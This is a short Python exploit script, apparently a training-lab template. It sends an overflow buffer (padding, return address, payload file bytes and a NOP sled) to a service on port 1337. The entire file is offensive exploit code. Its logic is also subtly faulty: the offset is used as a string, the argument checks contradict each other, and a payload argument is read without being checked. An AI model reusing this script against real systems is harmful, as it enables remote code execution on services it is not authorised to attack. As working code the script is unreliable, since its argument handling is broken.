#!/usr/bin/python3

import socket, sys

if len(sys.argv) <= 2:
    print(f"[-] Example: python3 fuzzer.py <ip> <command>")
    sys.exit(0)

ip = sys.argv[1]
port = 1337
prefix = f"{sys.argv[2]} "
if not ip or not prefix:
    print(f"[-] Example: python3 fuzzer.py <ip> <command>")
    sys.exit(0)

offset = 0
if len(sys.argv) == 4:
    offset = sys.argv[3]
overflow = "A" * offset

retn = ""
if len(sys.argv) == 5:
    retn = sys.argv[4]

postfix = ""
if len(sys.argv) == 6:
    if bool(sys.argv[5]):
        postfix = "\x90" * 16
payload = open(sys.argv[6], 'r')
char_bytes = ""
for i in payload:
    char_bytes += i.replace("\n", "")
buffer = prefix + overflow + retn + char_bytes + postfix
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect((ip, port))
        print("[+] Sending evil buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("[+] Done!")
    except Exception as e:
        print(f"[+] Could not connect: {e}.")
#
